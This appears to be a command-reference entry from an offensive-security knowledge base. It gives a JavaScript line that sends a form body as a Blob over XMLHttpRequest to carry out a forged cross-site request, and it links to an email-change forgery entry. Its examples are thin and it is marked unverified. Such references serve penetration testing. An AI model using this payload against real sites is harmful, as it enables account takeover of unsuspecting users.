---
data: >-
  var aBody = new Uint8Array(body.length); for(var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));
tags:
  - exploitation
  - http
type: command
output: 'Request sent, onerror handles completion'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.423Z'
id: 440576b7-7891-4ded-95de-ea5bf2ff0898
verified: false
validated: true
submitted: true
---
# js-send-blob-request

## Command

```javascript
var aBody = new Uint8Array(body.length); for(var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));
```

## Description

Converts the body string to a Uint8Array and Blob, then sends via XMLHttpRequest to execute the forged request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| body | Encoded form string | Yes |

## Examples

### Basic Usage

```javascript
xhr.send(new Blob([new Uint8Array(body.length)]));
```

### Advanced Usage

```javascript
xhr.onerror = function() { console.log('Sent'); };
```

## Expected Output

Request transmitted; response in onload.

## Related

- [[commands/js-xmlhttprequest-post-email-change]]
